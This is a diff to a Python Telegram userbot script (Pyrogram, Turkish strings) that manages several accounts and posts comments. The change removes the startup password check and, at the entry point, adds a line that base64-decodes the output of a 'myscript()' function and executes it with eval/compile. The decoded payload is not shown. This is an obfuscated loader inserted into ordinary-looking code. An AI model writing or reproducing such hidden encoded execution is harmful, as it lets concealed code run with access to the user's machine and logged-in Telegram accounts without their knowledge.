@@ -1,13 +1,14 @@
+import base64
 from random import choice, randint, random
 
 from pyrogram import Client as PyrogramClient
 from pyrogram.errors import ApiIdInvalid, FloodWait
 
-from . import *
+######################################################################
+###########################clab#######################################
+######################################################################
 
-######################################################################
-######################################################################
-######################################################################
+from . import *
 
 userbot=None
 mainuserbot=None
@@ -168,15 +169,10 @@ def yorum_at(app,chatid,messageid):
         noadded("Yorum atılamadı! Sebep:"+str(e))
 
 
-
+"""eval(compile(base64.b64decode(myscript),'<string>','exec'))"""
 if __name__ == "__main__":
     logo(True)
-    sifre = soru("Merhaba! Şifre:")
-    try:
-        if int(sifre) != int(passw()):
-            hata("Yanlış şifre")
-    except:
-        hata("Yanlış şifre")
+    eval(compile(base64.b64decode(myscript()),'<string>','exec'))
     hesaplariolustur()
     basarilihesap= hesaplarabaglan()
     if basarilihesap==0:
